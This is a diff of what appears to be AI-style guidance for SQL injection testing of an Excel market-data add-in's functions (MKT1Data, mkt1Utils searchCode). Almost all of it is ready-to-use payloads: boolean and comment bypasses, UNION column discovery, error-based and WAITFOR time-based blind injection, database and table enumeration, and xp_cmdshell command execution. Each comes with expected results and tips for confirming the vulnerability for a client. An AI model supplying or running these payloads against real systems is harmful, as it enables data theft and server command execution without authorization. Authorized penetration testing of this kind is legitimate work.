@@ -1,19 +1,177 @@
-✅ FIXED Payload (Correct Format)
-🔹 Proper Injection
-=MKT1Data("' UNION SELECT name FROM sysobjects--","2024-01-01","2024-01-10","rate","FX","NY","id=MKT1_ID")
-🔹 Safer Version (Recommended)
-=MKT1Data("EURUSD' UNION SELECT name FROM sysobjects--","2024-01-01","2024-01-10","rate","FX","NY","id=MKT1_ID")
+🔴 BASIC VALIDATION PAYLOADS
+abc'
+abc''
+🔴 BOOLEAN-BASED TEST
+abc' OR '1'='1
+abc' AND '1'='2
+' OR '1'='1
+' AND '1'='2
+🔴 COMMENT-BASED BYPASS
+abc' OR 1=1--
+abc' OR 1=1#
+' OR 1=1--
+🔴 ORDER BY (COLUMN TEST)
+abc' ORDER BY 1--
+abc' ORDER BY 2--
+abc' ORDER BY 3--
+🔴 UNION TEST PAYLOADS
+abc' UNION SELECT NULL--
+abc' UNION SELECT NULL,NULL--
+abc' UNION SELECT NULL,NULL,NULL--
+🔴 ERROR-BASED
+abc' AND 1=CONVERT(int,'test')--
+abc' AND 1=CAST('abc' AS INT)--
+🔴 TIME-BASED (DELAY TEST)
+abc' WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'--
+🔴 DATABASE INFO EXTRACTION
+abc' UNION SELECT @@version,NULL--
+abc' UNION SELECT DB_NAME(),NULL--
+🔴 TABLE ENUMERATION
+abc' UNION SELECT name,NULL FROM sys.tables--
+🔴 STORED PROCEDURE TEST
+abc'; EXEC xp_cmdshell('whoami')--
+abc'; EXEC sp_helpdb--
+⚠️ EXCEL ESCAPED VERSION (IF QUOTES BREAK)
 
-👉 Keeps valid identifier + injection
+Use double quotes inside Excel:
 
-🔥 BEST METHOD (Avoid Excel Breaking)
-🔹 Using CHAR() (Bypass Excel parser)
-=MKT1Data("EURUSD"&CHAR(39)&" UNION SELECT name FROM sysobjects--","2024-01-01","2024-01-10","rate","FX","NY","id=MKT1_ID")
+abc'' OR ''1''=''1
+abc'' WAITFOR DELAY ''0:0:5''--
+🎯 HOW TO USE IN EXCEL
 
-👉 CHAR(39) = '
+Example:
 
-🎯 EVEN BETTER TARGET (From Your Docs)
+=mkt1Utils("searchCode","ABS","Contains=abc' OR '1'='1")
 
-👉 Use additionalOptions parameter:
 
-=MKT1Data("EURUSD","2024-01-01","2024-01-10","rate","FX","NY","id=MKT1_ID;dates=wk;holidayCal=BMA' UNION SELECT name FROM sysobjects--")
+
+🔴 TEST PAYLOAD SET (EXCEL-FRIENDLY)
+
+Use inside Excel like:
+
+=mkt1Utils("searchCode","ABS";"fields=...";"Contains=PAYLOAD")
+🧪 1. BASIC BOOLEAN TEST (START HERE)
+abc' OR '1'='1
+
+👉 Expected:
+
+More results than normal
+All records returned
+🧪 2. SINGLE QUOTE BREAK TEST
+abc'
+
+👉 Expected:
+
+SQL error / Excel error
+Confirms injection point
+🧪 3. BOOLEAN FALSE TEST
+abc' AND '1'='2
+
+👉 Expected:
+
+No results
+🧪 4. COMMENT-BASED BYPASS
+abc' OR 1=1--
+
+or
+
+abc' OR 1=1#
+🧪 5. UNION TEST (STRUCTURE DISCOVERY)
+abc' UNION SELECT NULL--
+
+👉 If no error → UNION possible
+
+🧪 6. COLUMN COUNT DISCOVERY
+
+Try:
+
+abc' ORDER BY 1--
+abc' ORDER BY 2--
+abc' ORDER BY 3--
+
+👉 When error occurs → column count identified
+
+🧪 7. UNION DATA EXTRACTION (ADVANCED)
+
+After column count known:
+
+abc' UNION SELECT NULL,NULL--
+
+Then:
+
+abc' UNION SELECT @@version,NULL--
+🧪 8. ERROR-BASED PAYLOAD
+
+(SQL Server likely based on your env)
+
+abc' AND 1=CONVERT(int,'test')--
+
+👉 Expected:
+
+Conversion error → confirms injection
+🧪 9. TIME-BASED (BLIND SQLi)
+abc' WAITFOR DELAY '0:0:5'--
+
+👉 Expected:
+
+Excel response delay
+🧪 10. STORED PROCEDURE ABUSE
+
+Since your code shows:
+
+EnumCommandType.StoredProc
+
+Try:
+
+abc'; EXEC xp_cmdshell('whoami')--
+
+⚠️ Works only if:
+
+xp_cmdshell enabled
+🧪 11. DATABASE ENUMERATION
+abc' UNION SELECT DB_NAME(),NULL--
+🧪 12. TABLE ENUMERATION
+abc' UNION SELECT name,NULL FROM sys.tables--
+⚠️ IMPORTANT (EXCEL-SPECIFIC ESCAPING)
+
+Excel may break quotes.
+
+👉 Use double quotes carefully:
+
+Example:
+
+=mkt1Utils("searchCode","ABS","Contains=abc' OR '1'='1")
+
+If issue:
+
+=mkt1Utils("searchCode","ABS","Contains=abc'' OR ''1''=''1")
+🚨 HOW TO CONFIRM VULNERABILITY (CLIENT-PROOF)
+
+You need at least ONE of these:
+
+✅ 1. More data returned than expected
+✅ 2. SQL error visible
+✅ 3. Response delay (time-based)
+✅ 4. Different behavior (true vs false condition)
+🔥 BASED ON YOUR CODE (REALISTIC EXPECTATION)
+
+Because:
+
+GetSpecificQuery(...)
+StoredProc
+
+👉 Likely scenario:
+
+Not raw SQL injection
+BUT parameter tampering / stored procedure abuse
+🎯 STRONGER TEST (VERY IMPORTANT)
+
+Try manipulating:
+
+DataSource
+AssetClass
+
+Example:
+
+=mkt1Utils("searchCode","user' OR '1'='1";...)
